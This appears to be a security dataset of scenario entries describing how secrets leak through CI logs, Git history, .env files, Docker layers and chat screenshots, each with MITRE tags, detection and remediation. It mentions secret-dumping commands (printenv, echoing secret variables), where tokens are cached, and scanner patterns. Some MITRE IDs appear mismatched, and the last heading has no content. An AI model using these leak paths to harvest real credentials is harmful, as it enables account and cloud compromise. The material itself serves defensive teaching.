- **Attack Type**: Credential Mismanagement in Git URL
- **Target**: GitLab CI
- **Vulnerability**: Embedded PAT in git clone URL
- **MITRE**: T1552.001
- **Impact**: Access to internal repositories via leaked token
- **Tools**: GitLab CI, Git, GitLab PAT
- **Scenario**: A GitLab CI pipeline clones a private repo using a personal token embedded in the Git URL
- **Attack Steps**: 1. A developer configures .gitlab-ci.yml to clone another internal GitLab repo by using the Git HTTPS method.2. Instead of using a deploy token or CI job token, the dev hardcodes their personal access token (PAT) into the clone URL: https://<pat>@gitlab.com/org/repo.git.3. This URL is stored in Git history and leaked to CI job logs.4. GitLab’s Secret Detection picks up the PAT pattern and flags it.5. The token is revoked, and incident is logged by the SOC.6. Audit reveals other pipelines using similar practices.7. Developers are instructed to use GitLab job tokens or SSH-based cloning, and .gitlab-ci.yml is linted in pipelines going forward.8. CI logs are scrubbed for previous PAT leaks and redacted.
- **Detection**: GitLab Secret Detection + CI log review
- **Solution**: Use job tokens, avoid embedding secrets in URLs
- **Tags**: #gitlabci #patleak #gitclone

## Jenkinsfile Includes Hardcoded GCP Service Account Key

- **Attack Type**: Insecure CI Pipeline Credential Injection
- **Target**: GitHub Repo / Jenkins
- **Vulnerability**: GCP key committed in pipeline script
- **MITRE**: T1552.004
- **Impact**: Compromise of cloud resources
- **Tools**: Jenkins, Google Cloud SDK, GitHub
- **Scenario**: A JSON credential is hardcoded into Jenkinsfile and exposed in version control
- **Attack Steps**: 1. A developer copies a GCP service account JSON file and embeds its contents into a Jenkins pipeline file for testing.2. The Jenkinsfile is committed and pushed to the GitHub repo.3. GitHub Secret Scanning scans the file and detects a GCP key format based on the header "type": "service_account" and associated private key.4. GCP automatically revokes the key and sends notification to the project owner.5. Jenkins job fails due to revoked credentials.6. Security team conducts investigation and finds other secrets were also hardcoded in previous commits.7. Jenkins pipeline is updated to fetch credentials from a Vault or Jenkins credentials store, injected securely at runtime.8. Git history is cleaned using tools like BFG Repo-Cleaner.
- **Detection**: GitHub Secret Scanning + GCP IAM logs
- **Solution**: Store service account keys outside of code
- **Tags**: #gcpkey #jenkins #pipelineexposure

## Slack Bot Token Exposed via GitHub Action Arguments

- **Attack Type**: Improper Parameterization in CI Workflows
- **Target**: GitHub Actions Logs
- **Vulnerability**: Token exposed in workflow configuration
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to Slack bots and messages
- **Tools**: GitHub Actions, Slack API
- **Scenario**: Token passed as plain value in with: block in GitHub Actions
- **Attack Steps**: 1. A GitHub Actions workflow is set up to send build notifications via a third-party Slack Action.2. The developer mistakenly passes the actual bot token directly in the YAML file: with: token: xoxb-12345... instead of referencing ${{ secrets.SLACK_BOT_TOKEN }}.3. The token is shown in plain text in the CI logs, since masking was not triggered by GitHub.4. GitHub Secret Scanning detects the xoxb- prefix and raises an alert.5. The Slack token is automatically revoked by Slack’s API abuse system.6. Developer updates the workflow to pull secrets securely from GitHub’s encrypted secrets store.7. All CI jobs are reviewed to enforce secrets masking with ::add-mask:: commands.
- **Detection**: GitHub Secret Scan + Slack Alerts
- **Solution**: Use secrets. syntax, never expose inline tokens
- **Tags**: #slacktoken #actionleak #ciworkflow

## Secret Found in PR Review from Internal Contributor

- **Attack Type**: Dev Workflow Exposure
- **Target**: GitHub PR
- **Vulnerability**: Hardcoded credentials in code review
- **MITRE**: T1552.001
- **Impact**: Unauthorized database access during dev
- **Tools**: GitHub PR Review, Git
- **Scenario**: PR diff contains hardcoded MySQL credentials used in testing
- **Attack Steps**: 1. An internal engineer pushes a PR containing a test config file with the following line: DB_PASSWORD=admin123.2. The PR is reviewed by peers but no one notices the credential string.3. GitHub Secret Scanning detects the secret pattern in the PR diff and sends alerts to the repository administrator.4. The file is removed, and credentials are rotated on the test database.5. Code review policy is updated to include secrets scanning as a mandatory pre-merge check.6. Developers are trained on using .env files with proper .gitignore configurations.7. GitHub workflows are updated with truffleHog to scan PR diffs.
- **Detection**: GitHub PR Scanner + Review Rules
- **Solution**: Enforce secure review pipelines + auto scanning
- **Tags**: #pullrequest #secretdiff #codereview

## Azure Secret Leaked in Committed YAML Env File

- **Attack Type**: Cloud Token in Mismanaged Config
- **Target**: GitHub Repo
- **Vulnerability**: Azure token exposed in tracked file
- **MITRE**: T1552.001
- **Impact**: Unauthorized Azure service access
- **Tools**: Azure CLI, GitHub, GitGuardian
- **Scenario**: Azure secret written in plaintext env.yaml and committed
- **Attack Steps**: 1. Developer builds automation for Azure CLI commands and creates an env.yaml for use in a local script.2. File includes secrets like AZURE_CLIENT_ID and AZURE_CLIENT_SECRET in plaintext.3. File is accidentally tracked in Git and committed to the repository.4. GitHub Secret Scanning and GitGuardian flag the credential pattern.5. Azure alerts show token usage from external IPs, suggesting abuse.6. The secret is revoked in Azure AD, and .gitignore is updated.7. Team adopts Azure Key Vault and secure environment variable injection via CI tools like GitHub Actions.
- **Detection**: GitHub Advanced Security + Azure AD Logs
- **Solution**: Rotate and remove secrets from source files
- **Tags**: #azuretoken #envleak #yamlsecrets

## SMTP Password Committed in Node.js App

- **Attack Type**: Plaintext Password in App Logic
- **Target**: Node.js Project on GitHub
- **Vulnerability**: Passwords embedded in JS logic
- **MITRE**: T1552.001
- **Impact**: SMTP abuse or spam relay via leaked creds
- **Tools**: GitGuardian, SMTP
- **Scenario**: Email server password hardcoded in JavaScript and pushed
- **Attack Steps**: 1. Developer writes emailService.js for sending notifications and embeds SMTP credentials in code: password: 'supersecure'.2. File is committed and pushed without triggering a local pre-commit hook.3. GitGuardian scans public repos and flags the leak in its dashboard.4. SMTP password is still valid, and red team tests show mail relay is possible.5. Security team revokes credentials and sets up SMTP with IP restrictions.6. Developers are instructed to move email creds to .env and exclude it via .gitignore.7. CI pipelines now enforce eslint-plugin-no-secrets for JS projects.
- **Detection**: GitGuardian
- **Solution**: Use .env, mask secrets, and enforce linter rules
- **Tags**: #smtpleak #nodejs #jssecrets

## Twilio Auth Token Leaked in Legacy Feature Branch

- **Attack Type**: Secrets in Unmaintained Git Branches
- **Target**: GitHub Stale Branch
- **Vulnerability**: Secret in old unmerged branch
- **MITRE**: T1552.001
- **Impact**: SMS abuse or account hijack
- **Tools**: Git CLI, TruffleHog
- **Scenario**: Legacy branch contains .env file with real Twilio keys
- **Attack Steps**: 1. A developer had created a twilio-alerts branch for feature testing, which includes a .env with real TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN.2. The branch was never merged or deleted, staying dormant in the Git repo.3. During a red team audit, TruffleHog is run against all stale branches.4. The .env file is flagged, and Twilio keys are found to be active.5. Tokens are revoked, and Twilio dashboard logs are reviewed.6. Branch is deleted, .gitignore is updated, and automated stale branch deletion is enabled after 60 days.
- **Detection**: TruffleHog + Git Branch Scanner
- **Solution**: Delete old branches, scan all Git history
- **Tags**: #twilioleak #legacycode #branchhygiene

## .zip Artifact Upload Contains Secrets

- **Attack Type**: Leaked Secrets in Build Artifact
- **Target**: GitHub Releases
- **Vulnerability**: Secrets hidden in uploaded binaries
- **MITRE**: T1027
- **Impact**: Secret misuse via archived artifacts
- **Tools**: GitHub Releases, unzip, TruffleHog
- **Scenario**: Release ZIP contains a config file with plaintext API key
- **Attack Steps**: 1. A developer builds a CLI tool and packages it into a .zip archive for GitHub Releases.2. The archive includes a config.ini file with API_KEY=secretkey123 intended for testing.3. Months later, red team scans all release binaries using TruffleHog and finds the key.4. GitHub Secret Scanning doesn’t scan compressed binaries, so no previous alert was raised.5. The key is still active; it’s revoked immediately and the release is taken down.6. Releases are reviewed for sensitive content before uploading.7. New policy bans uploading archives with bundled config files.
- **Detection**: TruffleHog
- **Solution**: Scan all release artifacts before publishing
- **Tags**: #zipartifact #releaseleak #binarystorage

## Secret Exposed via Console Log in GitHub Actions

- **Attack Type**: Log Leakage via Debugging Commands
- **Target**: GitHub CI Logs
- **Vulnerability**: CI job logs revealing sensitive secrets
- **MITRE**: T1552.001
- **Impact**: CI logs expose confidential data
- **Tools**: GitHub Actions, CI Logs
- **Scenario**: printenv dumps CI secrets into logs during debug
- **Attack Steps**: 1. A CI job fails during build, so a developer adds printenv to diagnose environment issues.2. This command prints all environment variables to the Actions console, including secrets like AWS_SECRET_KEY, GH_TOKEN, etc.3. GitHub Secret Scanning detects some of the printed values and sends alerts, but others remain exposed.4. The CI job logs are publicly visible if the repo is open-source.5. Secrets are revoked, and team is instructed to never use printenv without proper masking.6. ::add-mask:: commands are added in workflows to protect output.7. GitHub Actions documentation is shared to train devs on output safety.
- **Detection**: GitHub Secret Scanner + Manual Review
- **Solution**: Avoid printing secrets, use masking in CI
- **Tags**: #printenv #logleak #ciworkflow

## GitHub OAuth App Leaks Client Secret in .env

- **Attack Type**: Misconfigured Secret in Environment File
- **Target**: GitHub Repo
- **Vulnerability**: Hardcoded OAuth credentials
- **MITRE**: T1552.001
- **Impact**: Account impersonation via GitHub OAuth
- **Tools**: GitHub, Git CLI, TruffleHog
- **Scenario**: A GitHub OAuth app’s client secret is unintentionally exposed in a committed .env file due to incorrect .gitignore configuration.
- **Attack Steps**: 1. A developer sets up GitHub OAuth integration for an internal dashboard.2. The developer stores the GITHUB_CLIENT_ID and GITHUB_CLIENT_SECRET in a local .env file.3. The .env file is accidentally committed to the Git repository because it wasn't added to .gitignore.4. After push, GitHub’s built-in secret scanning triggers an alert on the leaked format.5. TruffleHog scanning detects the same secret in historical commits.6. The secret is seen being used from unauthorized IPs, indicating possible abuse.7. The team revokes the OAuth credentials in GitHub Developer Settings.8. A new .env is added to .gitignore, and pre-commit hooks are configured with detect-secrets to prevent future exposures.
- **Detection**: GitHub Secret Scanning
- **Solution**: Rotate secrets, add .env to .gitignore, use pre-commit scanners
- **Tags**: #oauth #envleak #secretmanagement

## GitHub Actions Logs Reveal Secrets via Unmasked echo

- **Attack Type**: Improper Secret Handling in CI Logs
- **Target**: CI Job Logs
- **Vulnerability**: Secret exposed in CI output
- **MITRE**: T1552.001
- **Impact**: Secret leakage via logs and debug statements
- **Tools**: GitHub Actions
- **Scenario**: A CI pipeline mistakenly prints a secret into logs using an unmasked echo command, making it readable to all collaborators.
- **Attack Steps**: 1. A developer adds debugging code to a GitHub Actions workflow and uses echo "${{ secrets.API_KEY }}" to test secret injection.2. The secret value is printed in the logs without being masked, due to incorrect formatting.3. GitHub Actions fails to recognize the value as a secret due to missing ::add-mask:: directive or quote escape issues.4. Logs become publicly accessible to contributors or anyone with read permissions.5. GitHub’s Secret Scanning tool identifies the exposed value and flags the repository owner.6. The team revokes the exposed key and purges job logs to reduce exposure.7. Developers are educated to never print secrets to logs and use add-mask when necessary.8. A repository-wide policy is enforced to deny merge of jobs that contain direct echo of secrets.
- **Detection**: GitHub Secret Scanning + Logs
- **Solution**: Use add-mask, disable verbose logging for secrets
- **Tags**: #logleak #cierrors #echoexposure

## GitHub Pages Site Contains Firebase Keys in JavaScript

- **Attack Type**: Frontend Key Exposure
- **Target**: GitHub Pages
- **Vulnerability**: API key exposure in client JS
- **MITRE**: T1552.004
- **Impact**: Firebase abuse, quota depletion, potential DoS
- **Tools**: GitHub Pages, Firebase
- **Scenario**: A Firebase config object containing sensitive API keys is committed into frontend JS code hosted on GitHub Pages.
- **Attack Steps**: 1. A React developer integrates Firebase for user authentication and real-time database access.2. The developer includes the entire firebaseConfig object—including the apiKey—in a frontend JavaScript file (firebase.js).3. This file is committed and deployed to GitHub Pages as part of a static site.4. The key becomes publicly visible in browser DevTools.5. Automated scanners and bots find the key and use it to access Firebase backend.6. GitHub Secret Scanning identifies the leak after deployment.7. Firebase dashboard logs show abuse and alerts the project owner.8. The developer revokes the old API key, restricts it to server-side IPs, and moves Firebase logic to backend functions.
- **Detection**: GitHub Secret Scanning + Firebase Logs
- **Solution**: Move sensitive logic to backend, restrict frontend keys
- **Tags**: #firebase #frontendleak #staticapps

## Jenkins Plugin Logs Secrets in Debug Mode

- **Attack Type**: CI Plugin Logging Leak
- **Target**: Jenkins Console
- **Vulnerability**: Plugin logs containing secrets
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to 3rd-party service
- **Tools**: Jenkins, Console Logs
- **Scenario**: A Jenkins plugin logs a secret token during verbose request debugging, leaving it exposed in Jenkins logs.
- **Attack Steps**: 1. A Jenkins pipeline uses a plugin to interact with a third-party API.2. Debug logging is temporarily enabled in the Jenkins global configuration for troubleshooting purposes.3. During execution, the plugin logs HTTP requests, including the Authorization: Bearer <token> header.4. Jenkins console output reveals the token in plaintext.5. No log redaction or masking is applied by the plugin.6. The leaked token is discovered by GitHub Secret Scanning when Jenkins logs are uploaded to a repository for review.7. The secret is revoked and plugin settings are adjusted to mask credentials.8. Developers are advised to never enable debug mode in production and to audit plugin behavior regularly.
- **Detection**: Jenkins Logs, GitHub Secret Scanning
- **Solution**: Mask secrets, audit plugin logs, disable debug
- **Tags**: #jenkins #pluginlogging #secretdisclosure

## AWS Secret Leaked in Git Tag from Rebased Commit

- **Attack Type**: Git Metadata Exposure
- **Target**: Git Tags
- **Vulnerability**: Outdated Git tag points to old leak
- **MITRE**: T1552.001
- **Impact**: Long-term exposure of sensitive secrets
- **Tools**: Git CLI, TruffleHog
- **Scenario**: An old Git tag points to a commit that contained a .env file with AWS credentials before rebasing.
- **Attack Steps**: 1. A developer accidentally commits a .env file with AWS access keys.2. They later perform a git rebase and clean up the commit history.3. However, a Git tag (v0.9.5) created before rebasing still points to the original commit with the secret.4. TruffleHog scanning detects the .env file through the tag ref.5. The AWS key was never rotated and is still active.6. CloudTrail logs show the key was used from an unknown IP.7. The team revokes the AWS keys and deletes old Git tags pointing to compromised commits.8. GitHub Actions are updated to scan all refs including tags before releases.
- **Detection**: TruffleHog, Git Ref Audit
- **Solution**: Delete tags pointing to old commits with secrets
- **Tags**: #gitmetadata #awsleak #tagref

## GitHub Webhook URL Contains Token in Query Parameter

- **Attack Type**: Webhook Misconfiguration
- **Target**: GitHub Webhooks
- **Vulnerability**: Secrets in query string URLs
- **MITRE**: T1552.001
- **Impact**: Token hijack via logging and referrer headers
- **Tools**: GitHub Webhooks
- **Scenario**: A GitHub webhook sends a secret token embedded in the query string, making it leak via logs and referrals.
- **Attack Steps**: 1. A GitHub webhook is configured to send PR notifications to an internal dashboard endpoint.2. The webhook URL is set as https://internal.app/hooks?token=secrettoken123.3. This URL appears in outbound request logs, browser histories, and server access logs.4. Attackers scrape these logs or intercept requests to extract the token.5. GitHub’s Secret Scanning doesn’t monitor outbound webhook configurations.6. The token is used to replay API calls or impersonate GitHub services.7. The token is revoked and replaced with an Authorization: Bearer header method.8. DevOps policies enforce use of headers over query strings for authentication.
- **Detection**: Logs + Manual Audit
- **Solution**: Use headers for authentication, never query params
- **Tags**: #webhooks #tokenleak #urlsecrets

## GitHub CLI Stores Token in Plaintext on Disk

- **Attack Type**: Local Secret Storage Flaw
- **Target**: Local Dev Workstation
- **Vulnerability**: Plaintext token caching by CLI
- **MITRE**: T1552.001
- **Impact**: Account impersonation or code injection
- **Tools**: GitHub CLI, Bash
- **Scenario**: GitHub CLI caches token in plaintext in user home directory without encryption.
- **Attack Steps**: 1. A developer uses gh auth login to authenticate GitHub CLI.2. The access token is cached in a plaintext file under ~/.config/gh/hosts.yml.3. An attacker gains access to the developer machine (via malware or shared access) and reads the file.4. The token is used to push malicious code or open PRs under the developer’s identity.5. GitHub Security detects suspicious activity from a new IP address.6. The token is revoked, and 2FA is enforced for CLI access.7. GitHub CLI updates to use secure OS-based keyring storage.8. Developers are trained to manually inspect CLI config files and avoid saving secrets on shared systems.
- **Detection**: GitHub Logs + CLI Config
- **Solution**: Use OS keyring or encrypted vaults
- **Tags**: #ghcli #plaintextstorage #devsecurity

## Screenshot of AWS Keys Shared in Slack

- **Attack Type**: Visual Secret Exposure
- **Target**: Slack / Chat Apps
- **Vulnerability**: Secrets leaked via screenshots
- **MITRE**: T1110.003
- **Impact**: Unauthorized cloud access via OCR scraping
- **Tools**: Slack, AWS CLI
- **Scenario**: A developer shares a screenshot containing terminal output with AWS keys in Slack.
- **Attack Steps**: 1. A developer runs aws configure to set up credentials and takes a screenshot to help a colleague.2. The screenshot clearly shows the aws_access_key_id and aws_secret_access_key.3. The image is shared in a public or team Slack channel.4. Attackers scrape uploaded files or use OCR to extract the keys from images.5. AWS CloudTrail shows usage of the keys from external sources.6. The secret is revoked immediately, and Slack DLP integration is turned on.7. The team adds training on redacting credentials from screenshots before sharing.8. Secrets detection is extended to OCR-based scans in file uploads.
- **Detection**: Slack Logs + AWS CloudTrail
- **Solution**: Train teams to redact all credentials in images
- **Tags**: #visualleak #awskeys #ocrsecurity

## PyPI Package Accidentally Publishes .env with SMTP Keys

- **Attack Type**: Package Artifact Secret Leak
- **Target**: PyPI / Artifact Store
- **Vulnerability**: Secrets in package artifacts
- **MITRE**: T1552.004
- **Impact**: Email abuse and account ban risk
- **Tools**: PyPI, Twine, GitHub
- **Scenario**: A published PyPI package includes a .env file containing live email credentials.
- **Attack Steps**: 1. A Python library is prepared for public release using python setup.py sdist.2. The .env file used for local testing contains SMTP credentials for Mailgun.3. This file is accidentally bundled because the MANIFEST.in file does not exclude it.4. When the package is uploaded using twine, the .env file becomes public.5. Bots scan PyPI for such exposures and begin using the SMTP keys to send spam.6. Mailgun notifies the account owner of unusual traffic.7. The package is yanked, the secrets are rotated, and MANIFEST.in is updated.8. Future builds include artifact scanning prior to release.
- **Detection**: PyPI Package Review + Mailgun Alerts
- **Solution**: Always exclude sensitive files from sdist
- **Tags**: #pypileak #envexposure #smtpabuse

## Long-Lived PAT Leaked in GitHub Issue Comment

- **Attack Type**: Manual Secret Exposure
- **Target**: GitHub Issues
- **Vulnerability**: Secret leaked via manual post
- **MITRE**: T1552.001
- **Impact**: Repo compromise or data theft
- **Tools**: GitHub, Browser
- **Scenario**: A developer accidentally pastes a personal access token in a GitHub issue thread.
- **Attack Steps**: 1. A developer troubleshoots a private API and pastes a curl command in a GitHub issue comment.2. The command includes -H 'Authorization: token <PAT>' which is not redacted.3. Other team members or outsiders scrape the comment and extract the token.4. GitHub’s secret scanning detects the pattern and flags it.5. The PAT is seen being used for cloning private repositories.6. The token is revoked, issue comment edited, and team is alerted.7. An internal GitHub policy blocks comments containing secrets.8. Developers are advised to use GitHub’s fine-grained tokens with expiration.
- **Detection**: GitHub Secret Scanning + Audit Logs
- **Solution**: Use expiring tokens + avoid pasting auth headers
- **Tags**: #patleak #githubissue #secretexposure

## Accidental Secret Commit in Temporary Branch

- **Attack Type**: Git Branch Mismanagement
- **Target**: GitHub Repo
- **Vulnerability**: Secrets pushed in testing branches
- **MITRE**: T1552.001
- **Impact**: Financial abuse and account compromise
- **Tools**: Git, GitHub, GitGuardian
- **Scenario**: A temporary Git branch with testing secrets is pushed and overlooked, exposing secrets in remote history.
- **Attack Steps**: 1. A developer testing a new payment integration uses a temporary Git branch named feature/test-pay.2. During testing, they store real Stripe API keys in the codebase for convenience.3. Planning to delete the branch later, they push it to GitHub.4. The branch remains unmerged but accessible to anyone with repo access.5. GitGuardian detects the secret in the pushed branch within minutes.6. Stripe dashboard shows unusual charges from external IPs using the key.7. The team deletes the branch, revokes the API key, and audits other branches for lingering secrets.8. From then on, a GitHub Action is set to scan all pushed branches for secrets on every PR.
- **Detection**: GitGuardian + Git logs
- **Solution**: Automate branch scanning, restrict real secrets in dev
- **Tags**: #stripe #tempgitbranch #devsecrets

## Secrets Embedded in Git Submodule Repo

- **Attack Type**: Git Submodule Misuse
- **Target**: GitHub Submodules
- **Vulnerability**: Secrets in inherited Git modules
- **MITRE**: T1552.001
- **Impact**: Cloud resource abuse, cryptojacking
- **Tools**: Git Submodules, TruffleHog
- **Scenario**: A submodule repo added for testing contains secrets in its history, unnoticed by parent repo maintainers.
- **Attack Steps**: 1. A developer adds a Git submodule from an internal test repo into a main project.2. The submodule repo contains a .env file with GCP service account keys.3. The parent repo is pushed to GitHub and cloned by other developers.4. A Red Team simulating attacker recursively clones submodules and scans them.5. TruffleHog detects the .env in the submodule’s past commits.6. The GCP key is used to spin up crypto-mining instances before alerts catch on.7. The team removes the submodule, scrubs secrets from its Git history, and applies .gitmodules restrictions.8. A GitHub Actions workflow is added to scan all submodules on push.
- **Detection**: TruffleHog + GCP usage logs
- **Solution**: Audit submodules, enforce trusted repos
- **Tags**: #gcp #gitmodules #submoduleleak

## Secret Embedded in Hardcoded JWT Token in Frontend

- **Attack Type**: JWT Token Abuse
- **Target**: Static JS File
- **Vulnerability**: JWT token with embedded secrets
- **MITRE**: T1552.004
- **Impact**: Unintended access to internal services
- **Tools**: Browser DevTools, JWT.io
- **Scenario**: A statically served JavaScript file contains a full JWT token with embedded secrets viewable by anyone.
- **Attack Steps**: 1. A frontend developer adds an inline const jwtToken = "eyJhbGciOi..." in the auth.js file for local development.2. The JWT includes not only session data but also sensitive fields like email SMTP password in its payload.3. The file is deployed as-is during release, exposing the token.4. An attacker decodes the JWT using jwt.io, extracts secrets, and logs into the backend.5. GitHub secret scanning doesn't catch it as it's not in standard formats.6. An incident report confirms API misuse traced to that token.7. The token is invalidated, and development processes are updated to avoid embedding real tokens in code.8. Frontend build checks now scan for suspicious Base64 strings matching JWT structure.
- **Detection**: JWT linting tools + CI scans
- **Solution**: Never include real JWTs in frontend code
- **Tags**: #jwt #frontendsecrets #tokenleak

## GitHub Actions Caches .npmrc File with Auth Token

- **Attack Type**: Build Cache Misconfiguration
- **Target**: GitHub Actions
- **Vulnerability**: Sensitive files retained in CI cache
- **MITRE**: T1552.001
- **Impact**: Registry compromise, supply chain risks
- **Tools**: GitHub Actions, npm
- **Scenario**: CI caching mechanism retains .npmrc file containing private registry token.
- **Attack Steps**: 1. A developer configures GitHub Actions to cache ~/.npm directory for faster builds.2. The .npmrc file inside contains an auth token to access a private npm registry.3. On workflow runs, the cache is restored without proper file exclusion.4. Other developers’ jobs restoring this cache unknowingly have access to the token.5. TruffleHog scanning catches the token when a contributor pushes a build log file.6. The token is rotated, and .npmrc is added to cache exclusion list.7. A GitHub organization policy is applied to block caching of known sensitive paths.8. Review of cache restore and save keys is done to enforce safe usage.
- **Detection**: Cache audit + Secret scanners
- **Solution**: Exclude secret files from cache keys
- **Tags**: #npm #cachemisuse #buildsecrets

## GitHub Fork Contains Leaked Token Missed in Main Repo

- **Attack Type**: Forked Repo Oversight
- **Target**: GitHub Fork
- **Vulnerability**: Missed secrets in forked history
- **MITRE**: T1552.001
- **Impact**: Long-tail exposure from forgotten forks
- **Tools**: GitHub Forks, Git Logs
- **Scenario**: A fork of a private repo contains an old commit with secrets missed by secret scanning of the parent repo.
- **Attack Steps**: 1. A developer forks a private repository for testing and debugging.2. The forked version contains an early commit with a now-rotated API token.3. This fork is overlooked during security reviews, assuming the main repo is clean.4. GitHub Secret Scanning flags the token in the fork weeks later.5. Logs show unauthorized requests using the still-active token.6. The token is revoked, and the fork is made private or deleted.7. All forks are added to the scanning scope in GitHub Advanced Security.8. Internal policy mandates checking forks alongside main repo before tagging releases.
- **Detection**: GitHub Secret Scanning
- **Solution**: Scan forks regularly, rotate leaked tokens
- **Tags**: #forksecurity #legacytoken #githubforks

## AWS CloudFormation Template with Embedded Secrets

- **Attack Type**: IaC Secret Misuse
- **Target**: CloudFormation Template
- **Vulnerability**: Secrets exposed in infrastructure code
- **MITRE**: T1552.004
- **Impact**: Unauthorized AWS API usage
- **Tools**: AWS CloudFormation, GitHub
- **Scenario**: A CloudFormation YAML template includes plaintext IAM credentials in its resource block.
- **Attack Steps**: 1. A CloudOps engineer writes a CloudFormation template to create IAM roles and policies.2. In a UserData script or Parameters block, they accidentally embed plaintext IAM access keys.3. The file is committed and pushed to GitHub.4. GitHub Advanced Security flags the keys using secret scanning.5. AWS CloudTrail shows IAM activities from the key before revocation.6. The team replaces hardcoded values with AWS::SecretsManager::Secret references.7. All templates are scanned using checkov and cfn-lint before commit.8. Developers are trained on secure handling of secrets in IaC files.
- **Detection**: GitHub Secret Scanning + CloudTrail
- **Solution**: Use parameter store or Secrets Manager
- **Tags**: #cloudformation #iacleak #awskeys

## Personal GitHub Token Synced to Public Gist

- **Attack Type**: Gist Leakage
- **Target**: GitHub Gists
- **Vulnerability**: Secrets exposed in public Gist
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to private resources
- **Tools**: GitHub Gists
- **Scenario**: A developer stores a GitHub PAT in a public Gist accidentally used for note-taking.
- **Attack Steps**: 1. A developer uses a Gist to store commands for future reference.2. They paste a curl command that includes their GitHub PAT for a private API.3. The Gist is unintentionally made public.4. GitHub's secret scanning detects the token and emails the developer.5. Meanwhile, the token is used to fork private repos.6. The token is revoked, and the Gist is deleted.7. A GitHub org rule is enforced to auto-expire personal access tokens after 7 days.8. Developers are instructed to use secure password managers or encrypted notebooks.
- **Detection**: GitHub Secret Scanning
- **Solution**: Auto-expire tokens, ban Gist sharing of secrets
- **Tags**: #gistleak #patexposure #githubsecurity

## API Keys Leaked via Git Rebase Conflict File

- **Attack Type**: Git Merge Artifact Exposure
- **Target**: Git Merge Conflict
- **Vulnerability**: Secrets left in unresolved conflict blocks
- **MITRE**: T1552.001
- **Impact**: Code integrity risk and API misuse
- **Tools**: Git CLI
- **Scenario**: Secrets appear in <<<<<<< HEAD conflict blocks left in code after a bad rebase.
- **Attack Steps**: 1. A developer rebases a feature branch containing a .env file.2. Merge conflict occurs and is manually resolved, but conflict markers are left in the final commit.3. The section <<<<<<< HEAD contains both versions of an API key, one of which is valid.4. GitHub Secret Scanning detects the leak after push.5. External logs show the API key was used in attempts to access dev APIs.6. The key is revoked, and commit history rewritten to remove conflict markers.7. Developers are trained to inspect all merged files before finalizing PRs.8. A pre-push Git hook is implemented to scan for unresolved conflicts.
- **Detection**: Git Hooks + GitHub Secret Scanning
- **Solution**: Enforce conflict marker scans pre-push
- **Tags**: #mergeconflict #gitrebase #apiabuse

## Exposed Slack Token in JavaScript Console Log

- **Attack Type**: Debugging Oversight
- **Target**: JS Console
- **Vulnerability**: Secrets in browser logs
- **MITRE**: T1552.001
- **Impact**: Slack account compromise
- **Tools**: Chrome DevTools, Slack API
- **Scenario**: A token is logged in a browser console during development and later reused in production code.
- **Attack Steps**: 1. A frontend developer integrates Slack API and uses console.log(token) during local testing.2. This line is not removed before the final push and gets deployed.3. Users visiting the site can view the token via browser console.4. The token is used by attackers to post spam messages into Slack channels.5. GitHub Secret Scanning catches the token days after release.6. The Slack token is revoked and rotated with new scopes.7. Linting rules are updated to block logging of sensitive variables.8. The incident leads to implementing CI-based console.log scanners for production code.
- **Detection**: Console log scanners, GitHub Secret Scanning
- **Solution**: Remove debug statements before build
- **Tags**: #slacktoken #consolelog #devleak

## Dockerfile ARG Instruction Stores Secret in Image Layer

- **Attack Type**: Container Build Secrets
- **Target**: Docker Images
- **Vulnerability**: Secrets stored in image layers
- **MITRE**: T1552.004
- **Impact**: Container build artifact leakage
- **Tools**: Docker, GitHub Actions
- **Scenario**: A secret passed via Docker ARG is stored in the image history and exposed via docker history.
- **Attack Steps**: 1. A Dockerfile uses ARG AWS_KEY=abc123 to pass secrets at build time.2. The secret is not cleared after the build step.3. Attackers or analysts can inspect the built image using docker history or docker image inspect.4. The key appears in plain text in the build metadata.5. GitHub secret scanners miss it unless the Dockerfile is committed.6. The team learns of this through an external bug report.7. They rotate the keys, refactor Dockerfiles to use runtime secret injection, and rebuild all affected images.8. CI pipelines are updated to use short-lived tokens or mount secrets instead of ARG.
- **Detection**: docker history + bug reports
- **Solution**: Never pass secrets as build ARG
- **Tags**: #dockersecrets #containerbuild #argexposure

## GitHub Action Logs Contain Printed AWS Credentials

- **Attack Type**: CI/CD Logging Misuse
- **Target**: GitHub Actions
- **Vulnerability**: Secret exposed in build logs
- **MITRE**: T1552.001
- **Impact**: Internal exposure of critical credentials
- **Tools**: GitHub Actions
- **Scenario**: Credentials passed to workflow are printed in job logs, becoming accessible to repo collaborators.
- **Attack Steps**: 1. A DevOps engineer configures a GitHub Actions workflow to deploy an app using AWS CLI.2. Secrets are passed using ${{ secrets.AWS_SECRET_ACCESS_KEY }} into environment variables.3. However, due to a debug command like echo $AWS_SECRET_ACCESS_KEY, the value is printed into the Actions job logs.4. GitHub Actions stores logs that are accessible to all collaborators and reviewers on the repo.5. A junior team member inspecting logs for a failed build notices the AWS secret.6. While no malicious intent is observed, the team immediately revokes the credential.7. GitHub’s secret scanning doesn’t catch logs in time due to delay in indexing.8. Logging best practices are reviewed, and developers are educated on not printing secrets.9. Actions workflows are updated with set +x and job-level output redaction where possible.10. A linting tool is introduced to block echo of any environment variable starting with AWS_.
- **Detection**: GitHub Logs + Manual Review
- **Solution**: Remove secret printing in logs, restrict log access
- **Tags**: #actionslogs #secretprinting #awsleak

## Hardcoded Slack Webhook URL Found in Public Git Repo

- **Attack Type**: Messaging Token Exposure
- **Target**: GitHub Public Repo
- **Vulnerability**: Slack webhook in source code
- **MITRE**: T1552.001
- **Impact**: Slack notification spam and abuse
- **Tools**: GitHub, Slack
- **Scenario**: A Slack incoming webhook URL is accidentally committed to Git and pushed to a public repository.
- **Attack Steps**: 1. A developer testing automated Slack notifications copies the webhook URL into notify.py.2. They forget to move it to a config file or use an environment variable.3. The entire project is pushed to GitHub, initially as a private repo.4. Later, the developer changes the repo visibility to public without checking for secrets.5. A bot scanning GitHub for webhook URLs detects the Slack URL and starts sending spam messages.6. Slack logs show unauthorized posts; webhook is disabled immediately.7. GitHub Secret Scanning later sends an alert about the leaked URL.8. The incident leads to a new policy banning real webhook URLs in source files.9. The team creates a helper function to dynamically fetch and use webhook URLs from a secure vault.10. All public repos are scanned retrospectively using tools like Gitleaks and TruffleHog.
- **Detection**: GitHub Secret Scanning + Slack Audit
- **Solution**: Avoid hardcoding webhook URLs
- **Tags**: #slackwebhook #gitleak #tokenabuse

## GitLab CI Config Stores Secret in Plaintext Variable

